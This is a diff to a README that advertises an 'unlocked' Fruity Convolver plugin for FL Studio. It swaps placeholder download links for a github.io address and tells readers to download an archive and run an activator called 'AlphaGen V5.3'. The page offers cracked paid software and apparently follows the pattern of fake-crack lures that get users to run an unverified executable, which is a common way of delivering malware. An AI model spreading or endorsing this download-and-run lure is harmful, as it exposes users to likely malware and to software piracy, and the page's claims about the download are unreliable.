@@ -2,13 +2,15 @@
 
 Unlock Fruity Convolver in FL Studio to access high-quality convolution reverb and impulse response processing for detailed spatial sound design.
 
-[![Download](https://img.shields.io/badge/Download-Fruity_Convolver-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Fruity_Convolver-blueviolet)](https://fruity-convolver-fl-studio.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://fruity-convolver-fl-studio.github.io/.github
+)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Fruity Convolver with full access
